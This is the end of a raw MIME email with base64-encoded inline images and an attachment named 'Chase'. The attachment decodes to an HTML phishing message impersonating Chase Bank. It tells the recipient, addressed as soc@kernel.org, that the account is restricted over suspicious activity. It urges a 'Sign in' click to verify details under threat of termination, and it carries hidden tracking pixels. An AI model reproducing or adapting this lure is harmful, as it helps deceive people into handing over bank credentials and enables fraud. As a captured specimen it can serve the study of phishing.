Om1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzE0MCA3OS4xNjA0NTEsIDIw
MTcvMDUvMDYtMDE6MDg6MjEgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDov
L3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRp
b24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8x
LjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBl
L1Jlc291cmNlUmVmIyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAv
IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMyQUYwQTQ5NzUyQzExRUI4MzZEQjBEN0Y2
NjZDNkFFIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMyQUYwQTQ4NzUyQzExRUI4MzZE
QjBEN0Y2NjZDNkFFIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4
IE1hY2ludG9zaCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSIxOUVD
NjFGMTI3RUUwNkVGOTEyM0UzRUNBOEQ3OTEwNCIgc3RSZWY6ZG9jdW1lbnRJRD0iMTlFQzYx
RjEyN0VFMDZFRjkxMjNFM0VDQThENzkxMDQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRm
OlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7/7gAOQWRvYmUAZMAAAAAB
/9sAhAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAgICAgIC
AgICAgIDAwMDAwMDAwMDAQEBAQEBAQIBAQICAgECAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD
AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/wAARCADiAAwDAREAAhEBAxEB/8QAjAABAQEB
AAAAAAAAAAAAAAAABgUACQEBAQEAAwEAAAAAAAAAAAAABgUHAAIJARAAAQEFBAcIAgMAAAAA
AAAAAQARgcFCBTFxAjLwIVFhobESQZEigsIzQwTRUuFiAxEAAQEFBgUDBAMAAAAAAAAAAAHw
EYFDBUFRAjJCBCExcRIiYcETIzMUBpHhA//aAAwDAQACEQMRAD8A4wL3nPEwy4cM0LqmLCvJ
T6qKnMy7HCD9Kon/AGxBthO3eitOqv5OJEEm/pv46P4cC63U3TRqS9y/H3B3t8u0BUYlo1nv
vWY/r6quPj6exoleROxWtUeS6bFpcprjP5rXASj+4B2dUSs2/X0djR7cTQK6r8CjuTy+laTJ
cAJ8QHRswugVnNATzfYPq5kUdfG+K0eW1wBngaj5i7mzks5oGYe1vLi6jmR/qWiymuAM1rgT
SQOrBqtY3frFqz2gI7GiKOq0q/GvX2G0j4rQpTXAOYC6Pmw3RWfUH7iDqsqi4MQ0kfFaDKa4
CzAVST48DuYQGh4XY8K2jer5Fj7jWR8U+lNcCJgJpOfA7mEEof3BvWMitYOJdNidymuBM1rg
VSfcwv4INQ080UaVhfBUteNJHxTmU1wKmAqle5hv9SEUbh/ojWDGr5V6INpdNibymuBuuINp
YHVh1Brdm4xCFUbOgxquVRh8abaIg+ZEIUrNhu/CF0ZOL1F1W5DGV0EzlNcENcQfSrRcIIbS
c6dfYX1VX4fUYSugmUprghriEKWGYhuYO8olR0TvRFFlTV6KLpNNqXyYBOZEJUzMPKiFIz/y
K6lyUWs8DI9jW23JfJgFH/Uf6hOmhhDdoHcBFE6WiPTooqqeVegskfFKpQVmBem58A/sOJCL
UpHqnQS1HE9Fu/pRPI+KVOX4g3MiF6dnF/qRmlo7EIajlFMmn7JPJgHZkQ1TAOrACxpxNc0o
1TOadBFUcon7PN60lkwDsyIZp1uA9vSdbwjdOTyENQyiSRvb/KSO+kHdYepwHVhDuNiO09FT
E4Q7/IIZNNqRy2vD2oP0/OLxxt4qBsETnaXt9i4OEEjoNV7REg64h/6FuC4cyolPTyLW7EMn
lgrrk7IETVEg/QzYdX7cATwULYo5S3u8rehekdBXJZE1EKnjx4Sd+q/CSCouzWy0s7xeDi7L
5YK5ogRtUSJT7fzblNkNyh7OHJm6lfd82vLfxufl5K3otb2JMyMD/9k=

------=_NextPart_001_0013_5C0428F9.6CEFDA0B
Content-Type: image/jpeg; name="white-left.jpg"
Content-Transfer-Encoding: base64
Content-ID: <white-left.jpg>
Content-Disposition: inline; filename="white-left.jpg"

/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMfaHR0
cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1
TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5z
Om1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzE0MCA3OS4xNjA0NTEsIDIw
MTcvMDUvMDYtMDE6MDg6MjEgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDov
L3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRp
b24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8x
LjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBl
L1Jlc291cmNlUmVmIyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAv
IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMyQjU1NjRFNzUyQzExRUI4MzZEQjBEN0Y2
NjZDNkFFIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMyQjU1NjRENzUyQzExRUI4MzZE
QjBEN0Y2NjZDNkFFIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4
IE1hY2ludG9zaCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSIxOUVD
NjFGMTI3RUUwNkVGOTEyM0UzRUNBOEQ3OTEwNCIgc3RSZWY6ZG9jdW1lbnRJRD0iMTlFQzYx
RjEyN0VFMDZFRjkxMjNFM0VDQThENzkxMDQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRm
OlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7/7gAOQWRvYmUAZMAAAAAB
/9sAhAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAgICAgIC
AgICAgIDAwMDAwMDAwMDAQEBAQEBAQIBAQICAgECAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD
AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/wAARCABNAAwDAREAAhEBAxEB/8QAbwABAQAD
AAAAAAAAAAAAAAAABwYCBQoBAQAAAAAAAAAAAAAAAAAAAAAQAAEBBAgCCAcBAAAAAAAAABEB
ACExEkFRYXGhAgMFExTwkfEiMlIEJYHRYqIjJBUGEQEBAQAAAAAAAAAAAAAAAAAAEUH/2gAM
AwEAAhEDEQA/AO9D/QP9PnMO91OPUwCvD9zmDyPuIEWTQ2b6h0dRLFoJg5XL2sA7J7gXmbEg
wrYGbe0Ojq1BbyiGylgJpV50u6LEiJcwLe8oq6WcP8SioI9VelTAXSJzlHjBpE0TfiwK27Iq
6We7Mlge9YMBnw05yaVTN5lMPLUMWBO3RPxZrl6YsB7J+xSCfiYCPiYETckOnmdXBRXXFghp
F5iKxFELwRYbGC+3BDkzXYoi/NgjZF4wDiSHEA1APYLv1GkmfKqUK6insYNP/PTiTC0harq2
ChUUwtYMe59ODB//2Q==

------=_NextPart_001_0013_5C0428F9.6CEFDA0B
Content-Type: image/jpeg; name="white-right.jpg"
Content-Transfer-Encoding: base64
Content-ID: <white-right.jpg>
Content-Disposition: inline; filename="white-right.jpg"

/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMfaHR0
cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1
TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5z
Om1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzE0MCA3OS4xNjA0NTEsIDIw
MTcvMDUvMDYtMDE6MDg6MjEgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDov
L3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRp
b24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8x
LjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBl
L1Jlc291cmNlUmVmIyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAv
IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMyQjU1NjUyNzUyQzExRUI4MzZEQjBEN0Y2
NjZDNkFFIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMyQjU1NjUxNzUyQzExRUI4MzZE
QjBEN0Y2NjZDNkFFIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4
IE1hY2ludG9zaCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSIxOUVD
NjFGMTI3RUUwNkVGOTEyM0UzRUNBOEQ3OTEwNCIgc3RSZWY6ZG9jdW1lbnRJRD0iMTlFQzYx
RjEyN0VFMDZFRjkxMjNFM0VDQThENzkxMDQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRm
OlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7/7gAOQWRvYmUAZMAAAAAB
/9sAhAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAgICAgIC
AgICAgIDAwMDAwMDAwMDAQEBAQEBAQIBAQICAgECAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD
AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/wAARCABNAAwDAREAAhEBAxEB/8QAawABAQEB
AQAAAAAAAAAAAAAABwYBBQoBAQAAAAAAAAAAAAAAAAAAAAAQAAECBAMEBwkAAAAAAAAAABEB
IQAxQQJRYXESQwUGgaHhIkKCBPCR8TITIxQkRBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQAC
EQMRAD8A9xnKduzfaq1VG7atAMH83thAFHK1nftQqj1PSihDKAWG/HqAZKQCBAF/Ldibdjiu
alskgFLZ/XDHZx8QxIgDTl20XoyJKSyBUCjhIBM3JaWUhjpAHfL9ouS0BVGCIWtZkwwgEXc1
+XPXWAguB2C63EopWg8NZJnWAvtz5YCL4NaiXWsHDM0mUhUXSkBabnywElwqxUutZadCIV9x
gK8fbFJdcBy/S+j+krI+kpzxSA6w7oy6/jAamzTPtzgNgP/Z

------=_NextPart_001_0013_5C0428F9.6CEFDA0B--

------=_NextPart_000_0012_5C0428F9.6CEFDA0B
Content-Type: application/octet-stream; name="Chase"; charset="utf-8"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Chase"

PHA+PC9wPg0KPHRhYmxlIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZjNmNGY0OyIgd2lk
dGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCIgYWxpZ249ImNlbnRl
ciIgYmdjb2xvcj0iI2YzZjRmNCI+DQo8dGJvZHk+DQo8dHI+DQo8dGQ+PGJyIC8+DQo8dGFi
bGUgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNkOWRhZGI7IiBjZWxsc3BhY2luZz0iMCIg
Y2VsbHBhZGRpbmc9IjEiIGFsaWduPSJjZW50ZXIiIGJnY29sb3I9IiNkOWRhZGIiPg0KPHRi
b2R5Pg0KPHRyPg0KPHRkPg0KPHRhYmxlIHN0eWxlPSJ3aWR0aDogNzEwcHg7IGhlaWdodDog
Nzc1cHg7IGxpbmUtaGVpZ2h0OiAyMHB4OyBmb250LWZhbWlseTogYXJpYWwsIGhlbHZldGlj
YSwgc2Fucy1zZXJpZjsgZm9udC1zaXplOiAxNHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZm
ZmZmOyIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIiBhbGlnbj0iY2VudGVyIiBi
Z2NvbG9yPSIjZmZmZmZmIj4NCjx0Ym9keT4NCjx0cj4NCjx0ZCBzdHlsZT0id2lkdGg6IDVw
eDsiPiZuYnNwOzwvdGQ+DQo8dGQgc3R5bGU9IndpZHRoOiAxMDk2cHg7IHRleHQtYWxpZ246
IGp1c3RpZnk7IGxpbmUtaGVpZ2h0OiAyMHB4OyBmb250LWZhbWlseTogYXJpYWwsIGhlbHZl
dGljYSwgc2Fucy1zZXJpZjsgZm9udC1zaXplOiAxNHB4OyI+Jm5ic3A7PC90ZD4NCjx0ZCBz
dHlsZT0id2lkdGg6IDEwcHg7Ij4mbmJzcDs8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBzdHls
ZT0id2lkdGg6IDVweDsiPjxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogYXJpYWwsIGhlbHZl
dGljYSwgc2Fucy1zZXJpZjsgZm9udC1zaXplOiAxMnB0OyI+IDxpbWcgc3JjPSJodHRwOi8v
ZDM2Y3o5YnV3cnUxdHQuY2xvdWRmcm9udC5uZXQvYmxhbmsuZ2lmIiBhbHQ9IiIgd2lkdGg9
IjEiIGhlaWdodD0iMSIgYm9yZGVyPSIwIiAvPiA8L3NwYW4+PC90ZD4NCjx0ZCBzdHlsZT0i
d2lkdGg6IDEwOTZweDsgdGV4dC1hbGlnbjoganVzdGlmeTsgbGluZS1oZWlnaHQ6IDIwcHg7
IGZvbnQtZmFtaWx5OiBhcmlhbCwgaGVsdmV0aWNhLCBzYW5zLXNlcmlmOyBmb250LXNpemU6
IDE0cHg7Ij4NCjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4NCjxwIGFsaWduPSJjZW50
ZXIiPiZuYnNwOzwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxpbWcgc3JjPSJodHRwczovL3Vw
bG9hZC53aWtpbWVkaWEub3JnL3dpa2lwZWRpYS9jb21tb25zL3RodW1iL2UvZWQvQ2hhc2Vf
bG9nb18yMDA3LnN2Zy8xMjgwcHgtQ2hhc2VfbG9nb18yMDA3LnN2Zy5wbmciIGFsdD0iQ2hh
c2UgQmFuayIgd2lkdGg9IjI1MCIgaGVpZ2h0PSI0NyIgLz48L3A+DQo8ZGl2IGFsaWduPSJs
ZWZ0Ij4mbmJzcDs8L2Rpdj4NCjxwPjxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogVmVyZGFu
YSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsiPiA8c3BhbiBzdHlsZT0iZm9udC1m
YW1pbHk6IGFyaWFsLCBoZWx2ZXRpY2EsIHNhbnMtc2VyaWY7IGZvbnQtc2l6ZTogMTJwdDsi
PjxiciAvPjwvc3Bhbj4gPC9zcGFuPjwvcD4NCjxwIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50
ZXI7Ij4mbmJzcDs8L3A+DQo8cD5EZWFyIENoYXNlIEN1c3RvbWVyIHNvY0BrZXJuZWwub3Jn
LDwvcD4NCjxwPldlJ3JlIGN1cnJlbnRseSB1bmRlcmdvaW5nIGFuIGludmVzdGlnYXRpb24g
b24geW91ciBDaGFzZSBDSEVDS0lORy9TQVZJTkdTIGFjY291bnQgaW4gYWNjb3JkYW5jZSB3
aXRoIENoYXNlIEJhbmsgVGVybXMgJmFtcDsgU2VydmljZXMuIFRoaXMgaXMgY2F1c2VkIGR1
ZSB0byB0aGUgZm9sbG93aW5nOzwvcD4NCjxwPiZuYnNwOzwvcD4NCjx1bD4NCjxsaT5zdXNw
aWNpb3VzIGFjY291bnQgYWN0aXZpdHk8L2xpPg0KPGxpPlVudXN1YWwgYWNjb3VudCBwdXJj
aGFzZTwvbGk+DQo8bGk+TnVtZXJvdXMgbG9naW4gYXR0ZW1wdHM8L2xpPg0KPC91bD4NCjxw
PiZuYnNwOzwvcD4NCjxwPkFzIGEgcHJlY2F1dGlvbiwgV2UgaGF2ZSB0ZW1wb3JhcmlseSZu
YnNwO3Jlc3RyaWN0ZWQgeW91ciBhY2NvdW50IHRvIHByb3RlY3QgYWdhaW5zdCBmdXR1cmUg
dW5hdXRob3JpemVkIHRyYW5zYWN0aW9ucyB2ZXJpZnkgeW91IGluZm9ybWF0aW9uIG9uZmls
ZSB3aXRoIHVzLjwvcD4NCjxwPlRvIHZlcmlmeSB5b3VyIGFjY291bnQsIHZpc2l0IG91ciBz
ZWN1cmVkIGxpbmsgYmVsb3cgc28geW91IGNvdWxkIHNpZ24gaW4gYW5kIGZvbGxvdyB0aGUg
aW50cnVjdGlvbnMgdG8gaGVscCB1cyBjb25maXJtIHlvdXIgYWNjb3VudCBhbmQgcHJldmVu
dCBwZXJtYW5lbnQgc3VzcGVuc2lvbi48L3A+DQo8cCBzdHlsZT0idGV4dC1hbGlnbjogY2Vu
dGVyOyI+PGEgc3R5bGU9Im1hcmdpbjogMjBweCAwcHg7IHBhZGRpbmc6IDEwcHg7IGJvcmRl
ci1yYWRpdXM6IDNweDsgd2lkdGg6IDIxMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IGNvbG9y
OiAjZmZmZmZmOyBsaW5lLWhlaWdodDogMjVweDsgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5z
LXNlcmlmOyBmb250LXNpemU6IDE2cHg7IGZvbnQtd2VpZ2h0OiBib2xkOyB0ZXh0LWRlY29y
YXRpb246IG5vbmU7IGRpc3BsYXk6IGlubGluZS1ibG9jazsgbWluLWhlaWdodDogMjBweDsg
YmFja2dyb3VuZC1jb2xvcjogIzFhNmViNzsiIGhyZWY9Imh0dHBzOi8vIiB0YXJnZXQ9Il9i
bGFuayIgcmVsPSJub29wZW5lciBub3JlZmVycmVyIj5TaWduIGluPC9hPjwvcD4NCjxwIHN0
eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7Ij4mbmJzcDs8L3A+DQo8cD48c3BhbiBzdHlsZT0i
Zm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7Ij48
c3Ryb25nPldhcm5pbmc6IDwvc3Ryb25nPklnbm9yaW5nIG9yIGdpdmluZyB3cm9uZyBkZXRh
aWxzIG1lYW5zIHlvdSBhcmUgbm90IHRoZSByaWdodGZ1bCBvd25lciBvZiB0aGlzIGFjY291
bnQ8L3NwYW4+PC9wPg0KPHA+PHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OiBWZXJkYW5hLCBB
cmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOyI+YW5kIHdlIGFyZSBnb2luZyB0byB0ZXJt
aW5hdGUgeW91ciBhY2NvdW50IGlmIHN1Y2ggYWN0aXZpdHkgaXMgZGV0ZWN0ZWQuPC9zcGFu
PjwvcD4NCjxwPjxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogVmVyZGFuYSwgQXJpYWwsIEhl
bHZldGljYSwgc2Fucy1zZXJpZjsiPk9uY2UgeW91IGhhdmUgZG9uZSB0aGlzLCBvdXIgYW50
aS1mcmF1ZCBkZXBhcnRtZW50IHdpbGwgd29yayB0byByZXNvbHZlIHRoaXMgaXNzdWUuIFdl
PGJyIC8+YXJlIGhhcHB5IHlvdSBoYXZlIGNob3NlbiB1cyB0byBkbyBidXNpbmVzcyB3aXRo
Ljwvc3Bhbj48L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD48c3BhbiBzdHlsZT0iZm9udC1mYW1p
bHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7Ij5UaGFuayB5b3Us
PGJyIC8+Q2hhc2UgR3JvdXA8L3NwYW4+PC9wPg0KPGhyIC8+DQo8cCBzdHlsZT0idGV4dC1h
bGlnbjogY2VudGVyOyI+PHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OiBWZXJkYW5hLCBBcmlh
bCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOyI+Jm5ic3A7PHNwYW4gc3R5bGU9ImZvbnQtc2l6
ZTogOXB4OyI+QWxsIGNvbnRlbnRzICZjb3B5OyBDb3B5cmlnaHQgQ0hBU0UgR3JvdXAgMjAy
My4gQWxsIHJpZ2h0cyByZXNlcnZlZC48L3NwYW4+PC9zcGFuPjwvcD4NCjwvdGQ+DQo8dGQg
c3R5bGU9IndpZHRoOiAxMHB4OyI+PHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OiBhcmlhbCwg
aGVsdmV0aWNhLCBzYW5zLXNlcmlmOyBmb250LXNpemU6IDEycHQ7Ij4gPGltZyBzcmM9Imh0
dHA6Ly9kMzZjejlidXdydTF0dC5jbG91ZGZyb250Lm5ldC9ibGFuay5naWYiIGFsdD0iIiB3
aWR0aD0iMSIgaGVpZ2h0PSIxIiBib3JkZXI9IjAiIC8+IDwvc3Bhbj48L3RkPg0KPC90cj4N
Cjx0cj4NCjx0ZCBzdHlsZT0id2lkdGg6IDVweDsiPiZuYnNwOzwvdGQ+DQo8dGQgc3R5bGU9
IndpZHRoOiAxMDk2cHg7IiBhbGlnbj0icmlnaHQiPiZuYnNwOzwvdGQ+DQo8dGQgc3R5bGU9
IndpZHRoOiAxMHB4OyI+Jm5ic3A7PC90ZD4NCjwvdHI+DQo8L3Rib2R5Pg0KPC90YWJsZT4N
CjwvdGQ+DQo8L3RyPg0KPC90Ym9keT4NCjwvdGFibGU+DQo8L3RkPg0KPC90cj4NCjwvdGJv
ZHk+DQo8L3RhYmxlPg==

------=_NextPart_000_0012_5C0428F9.6CEFDA0B--
